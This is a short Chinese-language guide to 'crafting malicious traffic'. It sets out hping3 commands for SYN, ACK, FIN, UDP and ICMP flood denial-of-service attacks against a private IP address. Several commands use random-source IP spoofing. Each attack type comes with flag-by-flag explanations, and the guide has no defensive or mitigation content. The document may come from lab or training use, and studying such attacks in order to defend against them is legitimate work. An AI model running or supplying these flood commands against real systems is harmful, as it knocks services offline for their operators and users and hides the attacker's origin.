# 构造恶意流量

🔴 SYN Flood (SYN洪水)

SYN
Flood是最经典的DoS攻击之一，利用TCP协议的三次握手过程，向目标服务器发送大量伪造源IP的SYN请求，迅速占满服务器的半连接队列，导致其无法响应新的合法连接。

基本命令：

bash

sudo hping3 \--flood -S -p 80 10.66.249.202

进阶命令（随机源IP）：

bash

sudo hping3 \--flood -S \--rand-source -p 80 \[10.66.249.202 \]

参数解释：

\--flood：以最快速度发送数据包，不显示回复，实现洪水攻击效果。

-S：设置TCP数据包的SYN标志位。

-p 80：指定目标端口为80。

\--rand-source：为每个数据包随机生成一个源IP地址，进行IP欺骗，增加防御难度。

🔵 ACK Flood (ACK洪水)

ACK
Flood通过向目标发送大量ACK数据包，这些包可能属于已建立的连接，也可能是胡乱构造的。目标设备（如防火墙、负载均衡器）需要耗费大量资源去检查这些ACK包对应的连接状态，从而导致资源耗尽。

基本命令：

bash

sudo hping3 \--flood -A -p 80 \[10.66.249.202 \]

参数解释：

-A：设置TCP数据包的ACK标志位。

🟠 FIN Flood (FIN洪水)

FIN
Flood通过发送大量FIN数据包来攻击目标。FIN包通常用于正常关闭连接，但攻击者会大量发送这种包。一些实现不佳的网络栈在处理这些异常或大量的FIN包时，会消耗大量CPU资源进行分析或日志记录，从而导致性能下降。

基本命令：

bash

sudo hping3 \--flood -F -p 80 \[10.66.249.202 \]

参数解释：

-F：设置TCP数据包的FIN标志位。

🟡 UDP Flood (UDP洪水)

UDP
Flood是一种带宽消耗型攻击。攻击者向目标主机的随机或指定端口发送大量UDP数据包。目标系统会不断检查这些端口上是否有应用程序在监听，如果没有，就会回复ICMP"目标不可达"包。这个过程会大量消耗目标系统的资源，并可能占满网络带宽。

基本命令：

bash

sudo hping3 \--flood \--udp -p 53 \[10.66.249.202 \]

进阶命令（随机源IP）：

bash

sudo hping3 \--flood \--udp \--rand-source -p 53 \[10.66.249.202 \]

参数解释：

\--udp 或 -2：使用UDP协议模式。

-p 53：指定目标端口为53（DNS服务常用端口），也可以换成其他端口或留空。

🟢 ICMP Flood (ICMP洪水)

ICMP Flood是一种经典的洪水攻击，常被称为"Ping
Flood"。攻击者以极快的速度向目标发送大量ICMP Echo
Request（Ping请求）数据包。目标主机必须为每个请求都回复ICMP Echo
Reply，这个过程会大量消耗其CPU资源及网络带宽。

基本命令：

bash

sudo hping3 \--flood \--icmp \[10.66.249.202 \]

参数解释：

\--icmp 或 -1：使用ICMP协议模式。

-d 100：设置发送的数据包大小为100字节（可选）。
